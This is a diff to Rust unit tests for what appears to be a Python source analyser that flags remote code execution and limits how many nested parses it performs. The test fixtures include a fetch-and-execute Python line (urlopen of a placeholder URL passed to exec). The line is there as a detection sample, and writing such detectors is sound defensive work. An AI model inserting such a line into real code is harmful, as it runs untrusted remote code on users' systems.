@@ -210,11 +210,31 @@ fn written_source_is_parsed_with_the_bounded_parser() {
         "from urllib.request import urlopen as g\nexec(g('https://example.test/a').read())\n#{}",
         "x".repeat(super::MAX_WRITTEN_SOURCE_BYTES)
     );
-    assert!(super::remote_exec_urls(&oversized).is_empty());
+    let mut nested = crate::formats::source::parse::NestedParses::new(None);
+    assert!(super::remote_exec_urls(&oversized, &mut nested).is_empty());
     assert_eq!(
         super::remote_exec_urls(
-            "from urllib.request import urlopen as g\nexec(g('https://example.test/a').read())\n"
+            "from urllib.request import urlopen as g\nexec(g('https://example.test/a').read())\n",
+            &mut nested
         ),
         ["https://example.test/a"]
+    );
+}
+
+/// Literals written to temporary files are parsed within one per-file
+/// allowance; past it the analysis is reported truncated.
+#[test]
+fn written_source_parses_share_one_budget() {
+    let source = format!(
+        "import tempfile\nhandle = tempfile.NamedTemporaryFile(delete=False)\n{}",
+        "handle.write(b'print(1)')\n".repeat(40)
+    );
+    let parses = crate::formats::source::parse::PARSES.get();
+    let found = values(&source);
+    let used = crate::formats::source::parse::PARSES.get() - parses;
+    assert!(used <= 1 + 32, "{used} parses");
+    assert_eq!(
+        found.pointer("/source/python/module_calls_analysis/truncated"),
+        Some(&json!(true))
     );
 }
